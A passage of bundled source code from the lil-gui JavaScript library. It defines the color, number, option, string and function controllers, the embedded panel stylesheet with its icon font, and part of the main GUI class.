  const FORMATS = [STRING, INT, ARRAY, OBJECT];
  function getColorFormat(value) {
    return FORMATS.find((format) => format.match(value));
  }
  class ColorController extends Controller {
    constructor(parent, object, property, rgbScale) {
      super(parent, object, property, "color");
      this.$input = document.createElement("input");
      this.$input.setAttribute("type", "color");
      this.$input.setAttribute("tabindex", -1);
      this.$input.setAttribute("aria-labelledby", this.$name.id);
      this.$text = document.createElement("input");
      this.$text.setAttribute("type", "text");
      this.$text.setAttribute("spellcheck", "false");
      this.$text.setAttribute("aria-labelledby", this.$name.id);
      this.$display = document.createElement("div");
      this.$display.classList.add("display");
      this.$display.appendChild(this.$input);
      this.$widget.appendChild(this.$display);
      this.$widget.appendChild(this.$text);
      this._format = getColorFormat(this.initialValue);
      this._rgbScale = rgbScale;
      this._initialValueHexString = this.save();
      this._textFocused = false;
      this.$input.addEventListener("input", () => {
        this._setValueFromHexString(this.$input.value);
      });
      this.$input.addEventListener("blur", () => {
        this._callOnFinishChange();
      });
      this.$text.addEventListener("input", () => {
        const tryParse = normalizeColorString(this.$text.value);
        if (tryParse) {
          this._setValueFromHexString(tryParse);
        }
      });
      this.$text.addEventListener("focus", () => {
        this._textFocused = true;
        this.$text.select();
      });
      this.$text.addEventListener("blur", () => {
        this._textFocused = false;
        this.updateDisplay();
        this._callOnFinishChange();
      });
      this.$disable = this.$text;
      this.updateDisplay();
    }
    reset() {
      this._setValueFromHexString(this._initialValueHexString);
      return this;
    }
    _setValueFromHexString(value) {
      if (this._format.isPrimitive) {
        const newValue = this._format.fromHexString(value);
        this.setValue(newValue);
      } else {
        this._format.fromHexString(value, this.getValue(), this._rgbScale);
        this._callOnChange();
        this.updateDisplay();
      }
    }
    save() {
      return this._format.toHexString(this.getValue(), this._rgbScale);
    }
    load(value) {
      this._setValueFromHexString(value);
      this._callOnFinishChange();
      return this;
    }
    updateDisplay() {
      this.$input.value = this._format.toHexString(this.getValue(), this._rgbScale);
      if (!this._textFocused) {
        this.$text.value = this.$input.value.substring(1);
      }
      this.$display.style.backgroundColor = this.$input.value;
      return this;
    }
  }
  class FunctionController extends Controller {
    constructor(parent, object, property) {
      super(parent, object, property, "function");
      this.$button = document.createElement("button");
      this.$button.appendChild(this.$name);
      this.$widget.appendChild(this.$button);
      this.$button.addEventListener("click", (e) => {
        e.preventDefault();
        this.getValue().call(this.object);
      });
      this.$button.addEventListener("touchstart", () => {
      }, { passive: true });
      this.$disable = this.$button;
    }
  }
  class NumberController extends Controller {
    constructor(parent, object, property, min, max, step) {
      super(parent, object, property, "number");
      this._initInput();
      this.min(min);
      this.max(max);
      const stepExplicit = step !== void 0;
      this.step(stepExplicit ? step : this._getImplicitStep(), stepExplicit);
      this.updateDisplay();
    }
    decimals(decimals) {
      this._decimals = decimals;
      this.updateDisplay();
      return this;
    }
    min(min) {
      this._min = min;
      this._onUpdateMinMax();
      return this;
    }
    max(max) {
      this._max = max;
      this._onUpdateMinMax();
      return this;
    }
    step(step, explicit = true) {
      this._step = step;
      this._stepExplicit = explicit;
      return this;
    }
    updateDisplay() {
      const value = this.getValue();
      if (this._hasSlider) {
        let percent = (value - this._min) / (this._max - this._min);
        percent = Math.max(0, Math.min(percent, 1));
        this.$fill.style.width = percent * 100 + "%";
      }
      if (!this._inputFocused) {
        this.$input.value = this._decimals === void 0 ? value : value.toFixed(this._decimals);
      }
      return this;
    }
    _initInput() {
      this.$input = document.createElement("input");
      this.$input.setAttribute("type", "number");
      this.$input.setAttribute("step", "any");
      this.$input.setAttribute("aria-labelledby", this.$name.id);
      this.$widget.appendChild(this.$input);
      this.$disable = this.$input;
      const onInput = () => {
        let value = parseFloat(this.$input.value);
        if (isNaN(value))
          return;
        if (this._stepExplicit) {
          value = this._snap(value);
        }
        this.setValue(this._clamp(value));
      };
      const increment = (delta) => {
        const value = parseFloat(this.$input.value);
        if (isNaN(value))
          return;
        this._snapClampSetValue(value + delta);
        this.$input.value = this.getValue();
      };
      const onKeyDown = (e) => {
        if (e.code === "Enter") {
          this.$input.blur();
        }
        if (e.code === "ArrowUp") {
          e.preventDefault();
          increment(this._step * this._arrowKeyMultiplier(e));
        }
        if (e.code === "ArrowDown") {
          e.preventDefault();
          increment(this._step * this._arrowKeyMultiplier(e) * -1);
        }
      };
      const onWheel = (e) => {
        if (this._inputFocused) {
          e.preventDefault();
          increment(this._step * this._normalizeMouseWheel(e));
        }
      };
      let testingForVerticalDrag = false, initClientX, initClientY, prevClientY, initValue, dragDelta;
      const DRAG_THRESH = 5;
      const onMouseDown = (e) => {
        initClientX = e.clientX;
        initClientY = prevClientY = e.clientY;
        testingForVerticalDrag = true;
        initValue = this.getValue();
        dragDelta = 0;
        window.addEventListener("mousemove", onMouseMove);
        window.addEventListener("mouseup", onMouseUp);
      };
      const onMouseMove = (e) => {
        if (testingForVerticalDrag) {
          const dx = e.clientX - initClientX;
          const dy = e.clientY - initClientY;
          if (Math.abs(dy) > DRAG_THRESH) {
            e.preventDefault();
            this.$input.blur();
            testingForVerticalDrag = false;
            this._setDraggingStyle(true, "vertical");
          } else if (Math.abs(dx) > DRAG_THRESH) {
            onMouseUp();
          }
        }
        if (!testingForVerticalDrag) {
          const dy = e.clientY - prevClientY;
          dragDelta -= dy * this._step * this._arrowKeyMultiplier(e);
          if (initValue + dragDelta > this._max) {
            dragDelta = this._max - initValue;
          } else if (initValue + dragDelta < this._min) {
            dragDelta = this._min - initValue;
          }
          this._snapClampSetValue(initValue + dragDelta);
        }
        prevClientY = e.clientY;
      };
      const onMouseUp = () => {
        this._setDraggingStyle(false, "vertical");
        this._callOnFinishChange();
        window.removeEventListener("mousemove", onMouseMove);
        window.removeEventListener("mouseup", onMouseUp);
      };
      const onFocus = () => {
        this._inputFocused = true;
      };
      const onBlur = () => {
        this._inputFocused = false;
        this.updateDisplay();
        this._callOnFinishChange();
      };
      this.$input.addEventListener("input", onInput);
      this.$input.addEventListener("keydown", onKeyDown);
      this.$input.addEventListener("wheel", onWheel, { passive: false });
      this.$input.addEventListener("mousedown", onMouseDown);
      this.$input.addEventListener("focus", onFocus);
      this.$input.addEventListener("blur", onBlur);
    }
    _initSlider() {
      this._hasSlider = true;
      this.$slider = document.createElement("div");
      this.$slider.classList.add("slider");
      this.$fill = document.createElement("div");
      this.$fill.classList.add("fill");
      this.$slider.appendChild(this.$fill);
      this.$widget.insertBefore(this.$slider, this.$input);
      this.domElement.classList.add("hasSlider");
      const map = (v, a, b, c, d) => {
        return (v - a) / (b - a) * (d - c) + c;
      };
      const setValueFromX = (clientX) => {
        const rect = this.$slider.getBoundingClientRect();
        let value = map(clientX, rect.left, rect.right, this._min, this._max);
        this._snapClampSetValue(value);
      };
      const mouseDown = (e) => {
        this._setDraggingStyle(true);
        setValueFromX(e.clientX);
        window.addEventListener("mousemove", mouseMove);
        window.addEventListener("mouseup", mouseUp);
      };
      const mouseMove = (e) => {
        setValueFromX(e.clientX);
      };
      const mouseUp = () => {
        this._callOnFinishChange();
        this._setDraggingStyle(false);
        window.removeEventListener("mousemove", mouseMove);
        window.removeEventListener("mouseup", mouseUp);
      };
      let testingForScroll = false, prevClientX, prevClientY;
      const beginTouchDrag = (e) => {
        e.preventDefault();
        this._setDraggingStyle(true);
        setValueFromX(e.touches[0].clientX);
        testingForScroll = false;
      };
      const onTouchStart = (e) => {
        if (e.touches.length > 1)
          return;
        if (this._hasScrollBar) {
          prevClientX = e.touches[0].clientX;
          prevClientY = e.touches[0].clientY;
          testingForScroll = true;
        } else {
          beginTouchDrag(e);
        }
        window.addEventListener("touchmove", onTouchMove, { passive: false });
        window.addEventListener("touchend", onTouchEnd);
      };
      const onTouchMove = (e) => {
        if (testingForScroll) {
          const dx = e.touches[0].clientX - prevClientX;
          const dy = e.touches[0].clientY - prevClientY;
          if (Math.abs(dx) > Math.abs(dy)) {
            beginTouchDrag(e);
          } else {
            window.removeEventListener("touchmove", onTouchMove);
            window.removeEventListener("touchend", onTouchEnd);
          }
        } else {
          e.preventDefault();
          setValueFromX(e.touches[0].clientX);
        }
      };
      const onTouchEnd = () => {
        this._callOnFinishChange();
        this._setDraggingStyle(false);
        window.removeEventListener("touchmove", onTouchMove);
        window.removeEventListener("touchend", onTouchEnd);
      };
      const callOnFinishChange = this._callOnFinishChange.bind(this);
      const WHEEL_DEBOUNCE_TIME = 400;
      let wheelFinishChangeTimeout;
      const onWheel = (e) => {
        const isVertical = Math.abs(e.deltaX) < Math.abs(e.deltaY);
        if (isVertical && this._hasScrollBar)
          return;
        e.preventDefault();
        const delta = this._normalizeMouseWheel(e) * this._step;
        this._snapClampSetValue(this.getValue() + delta);
        this.$input.value = this.getValue();
        clearTimeout(wheelFinishChangeTimeout);
        wheelFinishChangeTimeout = setTimeout(callOnFinishChange, WHEEL_DEBOUNCE_TIME);
      };
      this.$slider.addEventListener("mousedown", mouseDown);
      this.$slider.addEventListener("touchstart", onTouchStart, { passive: false });
      this.$slider.addEventListener("wheel", onWheel, { passive: false });
    }
    _setDraggingStyle(active, axis = "horizontal") {
      if (this.$slider) {
        this.$slider.classList.toggle("active", active);
      }
      document.body.classList.toggle("lil-gui-dragging", active);
      document.body.classList.toggle(`lil-gui-${axis}`, active);
    }
    _getImplicitStep() {
      if (this._hasMin && this._hasMax) {
        return (this._max - this._min) / 1e3;
      }
      return 0.1;
    }
    _onUpdateMinMax() {
      if (!this._hasSlider && this._hasMin && this._hasMax) {
        if (!this._stepExplicit) {
          this.step(this._getImplicitStep(), false);
        }
        this._initSlider();
        this.updateDisplay();
      }
    }
    _normalizeMouseWheel(e) {
      let { deltaX, deltaY } = e;
      if (Math.floor(e.deltaY) !== e.deltaY && e.wheelDelta) {
        deltaX = 0;
        deltaY = -e.wheelDelta / 120;
        deltaY *= this._stepExplicit ? 1 : 10;
      }
      const wheel = deltaX + -deltaY;
      return wheel;
    }
    _arrowKeyMultiplier(e) {
      let mult = this._stepExplicit ? 1 : 10;
      if (e.shiftKey) {
        mult *= 10;
      } else if (e.altKey) {
        mult /= 10;
      }
      return mult;
    }
    _snap(value) {
      const r = Math.round(value / this._step) * this._step;
      return parseFloat(r.toPrecision(15));
    }
    _clamp(value) {
      if (value < this._min)
        value = this._min;
      if (value > this._max)
        value = this._max;
      return value;
    }
    _snapClampSetValue(value) {
      this.setValue(this._clamp(this._snap(value)));
    }
    get _hasScrollBar() {
      const root = this.parent.root.$children;
      return root.scrollHeight > root.clientHeight;
    }
    get _hasMin() {
      return this._min !== void 0;
    }
    get _hasMax() {
      return this._max !== void 0;
    }
  }
  class OptionController extends Controller {
    constructor(parent, object, property, options) {
      super(parent, object, property, "option");
      this.$select = document.createElement("select");
      this.$select.setAttribute("aria-labelledby", this.$name.id);
      this.$display = document.createElement("div");
      this.$display.classList.add("display");
      this._values = Array.isArray(options) ? options : Object.values(options);
      this._names = Array.isArray(options) ? options : Object.keys(options);
      this._names.forEach((name) => {
        const $option = document.createElement("option");
        $option.innerHTML = name;
        this.$select.appendChild($option);
      });
      this.$select.addEventListener("change", () => {
        this.setValue(this._values[this.$select.selectedIndex]);
        this._callOnFinishChange();
      });
      this.$select.addEventListener("focus", () => {
        this.$display.classList.add("focus");
      });
      this.$select.addEventListener("blur", () => {
        this.$display.classList.remove("focus");
      });
      this.$widget.appendChild(this.$select);
      this.$widget.appendChild(this.$display);
      this.$disable = this.$select;
      this.updateDisplay();
    }
    updateDisplay() {
      const value = this.getValue();
      const index = this._values.indexOf(value);
      this.$select.selectedIndex = index;
      this.$display.innerHTML = index === -1 ? value : this._names[index];
      return this;
    }
  }
  class StringController extends Controller {
    constructor(parent, object, property) {
      super(parent, object, property, "string");
      this.$input = document.createElement("input");
      this.$input.setAttribute("type", "text");
      this.$input.setAttribute("aria-labelledby", this.$name.id);
      this.$input.addEventListener("input", () => {
        this.setValue(this.$input.value);
      });
      this.$input.addEventListener("keydown", (e) => {
        if (e.code === "Enter") {
          this.$input.blur();
        }
      });
      this.$input.addEventListener("blur", () => {
        this._callOnFinishChange();
      });
      this.$widget.appendChild(this.$input);
      this.$disable = this.$input;
      this.updateDisplay();
    }
    updateDisplay() {
      this.$input.value = this.getValue();
      return this;
    }
  }
  const stylesheet = `.lil-gui {
  font-family: var(--font-family);
  font-size: var(--font-size);
  line-height: 1;
  font-weight: normal;
  font-style: normal;
  text-align: left;
  background-color: var(--background-color);
  color: var(--text-color);
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
  --background-color: #1f1f1f;
  --text-color: #ebebeb;
  --title-background-color: #111111;
  --title-text-color: #ebebeb;
  --widget-color: #424242;
  --hover-color: #4f4f4f;
  --focus-color: #595959;
  --number-color: #2cc9ff;
  --string-color: #a2db3c;
  --font-size: 11px;
  --input-font-size: 11px;
  --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
  --font-family-mono: Menlo, Monaco, Consolas, "Droid Sans Mono", monospace;
  --padding: 4px;
  --spacing: 4px;
  --widget-height: 20px;
  --name-width: 45%;
  --slider-knob-width: 2px;
  --slider-input-width: 27%;
  --color-input-width: 27%;
  --slider-input-min-width: 45px;
  --color-input-min-width: 45px;
  --folder-indent: 7px;
  --widget-padding: 0 0 0 3px;
  --widget-border-radius: 2px;
  --checkbox-size: calc(0.75 * var(--widget-height));
  --scrollbar-width: 5px;
}
.lil-gui, .lil-gui * {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
.lil-gui.root {
  width: var(--width, 245px);
  display: flex;
  flex-direction: column;
}
.lil-gui.root > .title {
  background: var(--title-background-color);
  color: var(--title-text-color);
}
.lil-gui.root > .children {
  overflow-x: hidden;
  overflow-y: auto;
}
.lil-gui.root > .children::-webkit-scrollbar {
  width: var(--scrollbar-width);
  height: var(--scrollbar-width);
  background: var(--background-color);
}
.lil-gui.root > .children::-webkit-scrollbar-thumb {
  border-radius: var(--scrollbar-width);
  background: var(--focus-color);
}
@media (pointer: coarse) {
  .lil-gui.allow-touch-styles {
    --widget-height: 28px;
    --padding: 6px;
    --spacing: 6px;
    --font-size: 13px;
    --input-font-size: 16px;
    --folder-indent: 10px;
    --scrollbar-width: 7px;
    --slider-input-min-width: 50px;
    --color-input-min-width: 65px;
  }
}
.lil-gui.force-touch-styles {
  --widget-height: 28px;
  --padding: 6px;
  --spacing: 6px;
  --font-size: 13px;
  --input-font-size: 16px;
  --folder-indent: 10px;
  --scrollbar-width: 7px;
  --slider-input-min-width: 50px;
  --color-input-min-width: 65px;
}
.lil-gui.autoPlace {
  max-height: 100%;
  position: fixed;
  top: 0;
  right: 15px;
  z-index: 1001;
}

.lil-gui .controller {
  display: flex;
  align-items: center;
  padding: 0 var(--padding);
  margin: var(--spacing) 0;
}
.lil-gui .controller.disabled {
  opacity: 0.5;
}
.lil-gui .controller.disabled, .lil-gui .controller.disabled * {
  pointer-events: none !important;
}
.lil-gui .controller > .name {
  min-width: var(--name-width);
  flex-shrink: 0;
  white-space: pre;
  padding-right: var(--spacing);
  line-height: var(--widget-height);
}
.lil-gui .controller .widget {
  position: relative;
  display: flex;
  align-items: center;
  width: 100%;
  min-height: var(--widget-height);
}
.lil-gui .controller.string input {
  color: var(--string-color);
}
.lil-gui .controller.boolean .widget {
  cursor: pointer;
}
.lil-gui .controller.color .display {
  width: 100%;
  height: var(--widget-height);
  border-radius: var(--widget-border-radius);
  position: relative;
}
@media (hover: hover) {
  .lil-gui .controller.color .display:hover:before {
    content: " ";
    display: block;
    position: absolute;
    border-radius: var(--widget-border-radius);
    border: 1px solid #fff9;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
.lil-gui .controller.color input[type=color] {
  opacity: 0;
  width: 100%;
  height: 100%;
  cursor: pointer;
}
.lil-gui .controller.color input[type=text] {
  margin-left: var(--spacing);
  font-family: var(--font-family-mono);
  min-width: var(--color-input-min-width);
  width: var(--color-input-width);
  flex-shrink: 0;
}
.lil-gui .controller.option select {
  opacity: 0;
  position: absolute;
  width: 100%;
  max-width: 100%;
}
.lil-gui .controller.option .display {
  position: relative;
  pointer-events: none;
  border-radius: var(--widget-border-radius);
  height: var(--widget-height);
  line-height: var(--widget-height);
  max-width: 100%;
  overflow: hidden;
  word-break: break-all;
  padding-left: 0.55em;
  padding-right: 1.75em;
  background: var(--widget-color);
}
@media (hover: hover) {
  .lil-gui .controller.option .display.focus {
    background: var(--focus-color);
  }
}
.lil-gui .controller.option .display.active {
  background: var(--focus-color);
}
.lil-gui .controller.option .display:after {
  font-family: "lil-gui";
  content: "↕";
  position: absolute;
  top: 0;
  right: 0;
  bottom: 0;
  padding-right: 0.375em;
}
.lil-gui .controller.option .widget,
.lil-gui .controller.option select {
  cursor: pointer;
}
@media (hover: hover) {
  .lil-gui .controller.option .widget:hover .display {
    background: var(--hover-color);
  }
}
.lil-gui .controller.number input {
  color: var(--number-color);
}
.lil-gui .controller.number.hasSlider input {
  margin-left: var(--spacing);
  width: var(--slider-input-width);
  min-width: var(--slider-input-min-width);
  flex-shrink: 0;
}
.lil-gui .controller.number .slider {
  width: 100%;
  height: var(--widget-height);
  background-color: var(--widget-color);
  border-radius: var(--widget-border-radius);
  padding-right: var(--slider-knob-width);
  overflow: hidden;
  cursor: ew-resize;
  touch-action: pan-y;
}
@media (hover: hover) {
  .lil-gui .controller.number .slider:hover {
    background-color: var(--hover-color);
  }
}
.lil-gui .controller.number .slider.active {
  background-color: var(--focus-color);
}
.lil-gui .controller.number .slider.active .fill {
  opacity: 0.95;
}
.lil-gui .controller.number .fill {
  height: 100%;
  border-right: var(--slider-knob-width) solid var(--number-color);
  box-sizing: content-box;
}

.lil-gui-dragging .lil-gui {
  --hover-color: var(--widget-color);
}
.lil-gui-dragging * {
  cursor: ew-resize !important;
}

.lil-gui-dragging.lil-gui-vertical * {
  cursor: ns-resize !important;
}

.lil-gui .title {
  --title-height: calc(var(--widget-height) + var(--spacing) * 1.25);
  height: var(--title-height);
  line-height: calc(var(--title-height) - 4px);
  font-weight: 600;
  padding: 0 var(--padding);
  -webkit-tap-highlight-color: transparent;
  cursor: pointer;
  outline: none;
  text-decoration-skip: objects;
}
.lil-gui .title:before {
  font-family: "lil-gui";
  content: "▾";
  padding-right: 2px;
  display: inline-block;
}
.lil-gui .title:active {
  background: var(--title-background-color);
  opacity: 0.75;
}
@media (hover: hover) {
  body:not(.lil-gui-dragging) .lil-gui .title:hover {
    background: var(--title-background-color);
    opacity: 0.85;
  }
  .lil-gui .title:focus {
    text-decoration: underline var(--focus-color);
  }
}
.lil-gui.root > .title:focus {
  text-decoration: none !important;
}
.lil-gui.closed > .title:before {
  content: "▸";
}
.lil-gui.closed > .children {
  transform: translateY(-7px);
  opacity: 0;
}
.lil-gui.closed:not(.transition) > .children {
  display: none;
}
.lil-gui.transition > .children {
  transition-duration: 300ms;
  transition-property: height, opacity, transform;
  transition-timing-function: cubic-bezier(0.2, 0.6, 0.35, 1);
  overflow: hidden;
  pointer-events: none;
}
.lil-gui .children:empty:before {
  content: "Empty";
  padding: 0 var(--padding);
  margin: var(--spacing) 0;
  display: block;
  height: var(--widget-height);
  font-style: italic;
  line-height: var(--widget-height);
  opacity: 0.5;
}
.lil-gui.root > .children > .lil-gui > .title {
  border: 0 solid var(--widget-color);
  border-width: 1px 0;
  transition: border-color 300ms;
}
.lil-gui.root > .children > .lil-gui.closed > .title {
  border-bottom-color: transparent;
}
.lil-gui + .controller {
  border-top: 1px solid var(--widget-color);
  margin-top: 0;
  padding-top: var(--spacing);
}
.lil-gui .lil-gui .lil-gui > .title {
  border: none;
}
.lil-gui .lil-gui .lil-gui > .children {
  border: none;
  margin-left: var(--folder-indent);
  border-left: 2px solid var(--widget-color);
}
.lil-gui .lil-gui .controller {
  border: none;
}

.lil-gui input {
  -webkit-tap-highlight-color: transparent;
  border: 0;
  outline: none;
  font-family: var(--font-family);
  font-size: var(--input-font-size);
  border-radius: var(--widget-border-radius);
  height: var(--widget-height);
  background: var(--widget-color);
  color: var(--text-color);
  width: 100%;
}
@media (hover: hover) {
  .lil-gui input:hover {
    background: var(--hover-color);
  }
  .lil-gui input:active {
    background: var(--focus-color);
  }
}
.lil-gui input:disabled {
  opacity: 1;
}
.lil-gui input[type=text],
.lil-gui input[type=number] {
  padding: var(--widget-padding);
}
.lil-gui input[type=text]:focus,
.lil-gui input[type=number]:focus {
  background: var(--focus-color);
}
.lil-gui input::-webkit-outer-spin-button,
.lil-gui input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}
.lil-gui input[type=number] {
  -moz-appearance: textfield;
}
.lil-gui input[type=checkbox] {
  appearance: none;
  -webkit-appearance: none;
  height: var(--checkbox-size);
  width: var(--checkbox-size);
  border-radius: var(--widget-border-radius);
  text-align: center;
  cursor: pointer;
}
.lil-gui input[type=checkbox]:checked:before {
  font-family: "lil-gui";
  content: "✓";
  font-size: var(--checkbox-size);
  line-height: var(--checkbox-size);
}
@media (hover: hover) {
  .lil-gui input[type=checkbox]:focus {
    box-shadow: inset 0 0 0 1px var(--focus-color);
  }
}
.lil-gui button {
  -webkit-tap-highlight-color: transparent;
  outline: none;
  cursor: pointer;
  font-family: var(--font-family);
  font-size: var(--font-size);
  color: var(--text-color);
  width: 100%;
  height: var(--widget-height);
  text-transform: none;
  background: var(--widget-color);
  border-radius: var(--widget-border-radius);
  border: 1px solid var(--widget-color);
  text-align: center;
  line-height: calc(var(--widget-height) - 4px);
}
@media (hover: hover) {
  .lil-gui button:hover {
    background: var(--hover-color);
    border-color: var(--hover-color);
  }
  .lil-gui button:focus {
    border-color: var(--focus-color);
  }
}
.lil-gui button:active {
  background: var(--focus-color);
}

@font-face {
  font-family: "lil-gui";
  src: url("data:application/font-woff;charset=utf-8;base64,d09GRgABAAAAAAUsAAsAAAAACJwAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABHU1VCAAABCAAAAH4AAADAImwmYE9TLzIAAAGIAAAAPwAAAGBKqH5SY21hcAAAAcgAAAD0AAACrukyyJBnbHlmAAACvAAAAF8AAACEIZpWH2hlYWQAAAMcAAAAJwAAADZfcj2zaGhlYQAAA0QAAAAYAAAAJAC5AHhobXR4AAADXAAAABAAAABMAZAAAGxvY2EAAANsAAAAFAAAACgCEgIybWF4cAAAA4AAAAAeAAAAIAEfABJuYW1lAAADoAAAASIAAAIK9SUU/XBvc3QAAATEAAAAZgAAAJCTcMc2eJxVjbEOgjAURU+hFRBK1dGRL+ALnAiToyMLEzFpnPz/eAshwSa97517c/MwwJmeB9kwPl+0cf5+uGPZXsqPu4nvZabcSZldZ6kfyWnomFY/eScKqZNWupKJO6kXN3K9uCVoL7iInPr1X5baXs3tjuMqCtzEuagm/AAlzQgPAAB4nGNgYRBlnMDAysDAYM/gBiT5oLQBAwuDJAMDEwMrMwNWEJDmmsJwgCFeXZghBcjlZMgFCzOiKOIFAB71Bb8AeJy1kjFuwkAQRZ+DwRAwBtNQRUGKQ8OdKCAWUhAgKLhIuAsVSpWz5Bbkj3dEgYiUIszqWdpZe+Z7/wB1oCYmIoboiwiLT2WjKl/jscrHfGg/pKdMkyklC5Zs2LEfHYpjcRoPzme9MWWmk3dWbK9ObkWkikOetJ554fWyoEsmdSlt+uR0pCJR34b6t/TVg1SY3sYvdf8vuiKrpyaDXDISiegp17p7579Gp3p++y7HPAiY9pmTibljrr85qSidtlg4+l25GLCaS8e6rRxNBmsnERunKbaOObRz7N72ju5vdAjYpBXHgJylOAVsMseDAPEP8LYoUHicY2BiAAEfhiAGJgZWBgZ7RnFRdnVJELCQlBSRlATJMoLV2DK4glSYs6ubq5vbKrJLSbGrgEmovDuDJVhe3VzcXFwNLCOILB/C4IuQ1xTn5FPilBTj5FPmBAB4WwoqAHicY2BkYGAA4sk1sR/j+W2+MnAzpDBgAyEMQUCSg4EJxAEAwUgFHgB4nGNgZGBgSGFggJMhDIwMqEAYAByHATJ4nGNgAIIUNEwmAABl3AGReJxjYAACIQYlBiMGJ3wQAEcQBEV4nGNgZGBgEGZgY2BiAAEQyQWEDAz/wXwGAAsPATIAAHicXdBNSsNAHAXwl35iA0UQXYnMShfS9GPZA7T7LgIu03SSpkwzYTIt1BN4Ak/gKTyAeCxfw39jZkjymzcvAwmAW/wgwHUEGDb36+jQQ3GXGot79L24jxCP4gHzF/EIr4jEIe7wxhOC3g2TMYy4Q7+Lu/SHuEd/ivt4wJd4wPxbPEKMX3GI5+DJFGaSn4qNzk8mcbKSR6xdXdhSzaOZJGtdapd4vVPbi6rP+cL7TGXOHtXKll4bY1Xl7EGnPtp7Xy2n00zyKLVHfkHBa4IcJ2oD3cgggWvt/V/FbDrUlEUJhTn/0azVWbNTNr0Ens8de1tceK9xZmfB1CPjOmPH4kitmvOubcNpmVTN3oFJyjzCvnmrwhJTzqzVj9jiSX911FjeAAB4nG3HMRKCMBBA0f0giiKi4DU8k0V2GWbIZDOh4PoWWvq6J5V8If9NVNQcaDhyouXMhY4rPTcG7jwYmXhKq8Wz+p762aNaeYXom2n3m2dLTVgsrCgFJ7OTmIkYbwIbC6vIB7WmFfAAAA==") format("woff");
}`;
  function _injectStyles(cssContent) {
    const injected = document.createElement("style");
    injected.innerHTML = cssContent;
    const before = document.querySelector("head link[rel=stylesheet], head style");
    if (before) {
      document.head.insertBefore(injected, before);
    } else {
      document.head.appendChild(injected);
    }
  }
  let stylesInjected = false;
  class GUI {
    constructor({
      parent,
      autoPlace = parent === void 0,
      container,
      width,
      title = "Controls",
      injectStyles = true,
      touchStyles = true
    } = {}) {
      this.parent = parent;
      this.root = parent ? parent.root : this;
      this.children = [];
      this.controllers = [];
      this.folders = [];
      this._closed = false;
      this._hidden = false;
      this.domElement = document.createElement("div");
      this.domElement.classList.add("lil-gui");
      this.$title = document.createElement("div");
      this.$title.classList.add("title");
      this.$title.setAttribute("role", "button");
      this.$title.setAttribute("aria-expanded", true);
      this.$title.setAttribute("tabindex", 0);
      this.$title.addEventListener("click", () => this.openAnimated(this._closed));
      this.$title.addEventListener("keydown", (e) => {
        if (e.code === "Enter" || e.code === "Space") {
          e.preventDefault();
          this.$title.click();
        }
      });
      this.$title.addEventListener("touchstart", () => {
      }, { passive: true });
      this.$children = document.createElement("div");
      this.$children.classList.add("children");
      this.domElement.appendChild(this.$title);
      this.domElement.appendChild(this.$children);
      this.title(title);
      if (touchStyles) {
        this.domElement.classList.add("allow-touch-styles");
      }
      if (this.parent) {
        this.parent.children.push(this);
        this.parent.folders.push(this);
        this.parent.$children.appendChild(this.domElement);
        return;
      }
      this.domElement.classList.add("root");
      if (!stylesInjected && injectStyles) {
        _injectStyles(stylesheet);
        stylesInjected = true;
      }
      if (container) {
        container.appendChild(this.domElement);
      } else if (autoPlace) {
        this.domElement.classList.add("autoPlace");
        document.body.appendChild(this.domElement);
      }
      if (width) {
        this.domElement.style.setProperty("--width", width + "px");
      }
      this.domElement.addEventListener("keydown", (e) => e.stopPropagation());
      this.domElement.addEventListener("keyup", (e) => e.stopPropagation());
    }
    add(object, property, $1, max, step) {
      if (Object($1) === $1) {
        return new OptionController(this, object, property, $1);
      }
      const initialValue = object[property];
      switch (typeof initialValue) {
        case "number":
          return new NumberController(this, object, property, $1, max, step);
        case "boolean":
          return new BooleanController(this, object, property);
        case "string":
          return new StringController(this, object, property);
        case "function":
          return new FunctionController(this, object, property);
      }
      console.error(`gui.add failed
	property:`, property, `
	object:`, object, `
	value:`, initialValue);
    }
    addColor(object, property, rgbScale = 1) {
      return new ColorController(this, object, property, rgbScale);
    }
    addFolder(title) {
      return new GUI({ parent: this, title });
    }
    load(obj, recursive = true) {
      if (obj.controllers) {
        this.controllers.forEach((c) => {
          if (c instanceof FunctionController)
            return;
          if (c._name in obj.controllers) {
            c.load(obj.controllers[c._name]);
          }
        });
      }
      if (recursive && obj.folders) {
        this.folders.forEach((f) => {
          if (f._title in obj.folders) {
            f.load(obj.folders[f._title]);
          }
        });
      }
      return this;
    }
    save(recursive = true) {
      const obj = {
        controllers: {},
        folders: {}
      };
      this.controllers.forEach((c) => {
        if (c instanceof FunctionController)
          return;
        if (c._name in obj.controllers) {
          throw new Error(`Cannot save GUI with duplicate property "${c._name}"`);
        }
        obj.controllers[c._name] = c.save();
      });
      if (recursive) {
        this.folders.forEach((f) => {
          if (f._title in obj.folders) {
            throw new Error(`Cannot save GUI with duplicate folder "${f._title}"`);
          }
          obj.folders[f._title] = f.save();
        });
      }
      return obj;
    }
    open(open2 = true) {
      this._closed = !open2;
      this.$title.setAttribute("aria-expanded", !this._closed);
      this.domElement.classList.toggle("closed", this._closed);
      return this;
    }
    close() {
      return this.open(false);
    }
    show(show = true) {
      this._hidden = !show;
      this.domElement.style.display = this._hidden ? "none" : "";
      return this;
    }
    hide() {
      return this.show(false);
    }
    openAnimated(open2 = true) {
      this._closed = !open2;
      this.$title.setAttribute("aria-expanded", !this._closed);
      requestAnimationFrame(() => {
        const initialHeight = this.$children.clientHeight;
        this.$children.style.height = initialHeight + "px";
        this.domElement.classList.add("transition");
        const onTransitionEnd = (e) => {
          if (e.target !== this.$children)
            return;
          this.$children.style.height = "";
          this.domElement.classList.remove("transition");
          this.$children.removeEventListener("transitionend", onTransitionEnd);
        };
        this.$children.addEventListener("transitionend", onTransitionEnd);
        const targetHeight = !open2 ? 0 : this.$children.scrollHeight;
        this.domElement.classList.toggle("closed", !open2);
        requestAnimationFrame(() => {
          this.$children.style.height = targetHeight + "px";
        });
      });
      return this;
    }
    title(title) {
      this._title = title;
      this.$title.innerHTML = title;
      return this;
    }
    reset(recursive = true) {
      const controllers = recursive ? this.controllersRecursive() : this.controllers;
      controllers.forEach((c) => c.reset());
      return this;
    }
    onChange(callback) {
      this._onChange = callback;
      return this;
    }
    _callOnChange(controller) {
      if (this.parent) {
        this.parent._callOnChange(controller);
      }
